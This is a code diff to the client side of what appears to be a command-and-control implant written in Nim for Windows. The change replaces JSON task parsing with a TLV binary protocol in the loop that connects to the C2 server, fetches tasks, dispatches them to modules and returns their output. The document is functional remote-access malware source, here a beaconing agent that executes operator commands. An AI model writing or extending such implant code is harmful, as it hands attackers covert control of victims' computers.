@@ -1,14 +1,12 @@
-import std/[json, os, jsonutils, strutils]
-
-import winim/lean
-
+import std/[os, strutils]
 when defined(tcp):
   import std/net
 elif defined(http):
   import std/httpclient
 
-import modules, communication
+import winim/lean, tlv
 
+import modules, communication
 import ../clientTasks/index, types
 
 const port {.intdefine.}: int = 1234
@@ -36,13 +34,21 @@ elif defined(windows):
 else:
     const osType = "unknown"
 
-proc handleTask(app: App, jsonNode: JsonNode) =
+proc handleTask(app: App, taskTLV: string) =
+  echo taskTLV
 
-  let taskId = jsonNode["taskId"].getInt()
-  var params: seq[string] = @[]
-  for param in jsonNode["data"]:
-    params.add param.getStr()
-  let taskName = jsonNode["task"].getStr()
+  let p = initParser()
+  p.setBuffer(cast[seq[byte]](taskTLV))
+
+  let taskId = p.extractInt32()
+  let taskName = p.extractString()
+  echo taskName
+  let paramCount = p.extractInt32()
+  var params = newSeqOfCap[string](paramCount)
+
+  for _ in 1..paramCount:
+    params.add p.extractString()
+  
   if taskName == "identify":
     app.identify(
       taskId,
@@ -61,25 +67,33 @@ proc handleTask(app: App, jsonNode: JsonNode) =
     let taskOutput = newTaskOutput(taskId)
     var taskNames: seq[tuple[name: string]] = @[(name: "enumtasks"), (name: "sleep")]
     for task in tasks: taskNames.add (name: task.name)
-    taskOutput.data = $(toJson taskNames)
+
+    let b = initBuilder()
+    b.addInt32(cast[int32](len tasks))
+    for task in tasks: b.addString(task.name)
+    taskOutput.data = b.encodeString()
+
     app.sendOutput(taskOutput)
   else:
-    var foundTask = false
     for cTask in tasks:
       if cTask.name == taskName:
-        foundTask = true
         cTask.execute(app, taskId, params)
-    if not foundTask:
-      app.unknownTask(taskId, jsonNode["task"].getStr())
+        return
+
+    app.unknownTask(taskId, taskName)
 
 proc receiveCommands(app: App) =
   app.connectToC2()
   while true:
     let tasks = app.fetchTasks()
-    echo $tasks
-    if tasks.kind == JArray:
-      for task in tasks:
-        handleTask app, task
+    if tasks == "": continue
+    let p = initParser()
+    p.setBuffer(cast[seq[byte]](tasks))
+    
+    let tasksCount = p.extractInt32()
+    for _ in 1..tasksCount:
+      handleTask app, p.extractString()
+
     sleep sleepTime*1000
 
 proc beginConnection() =
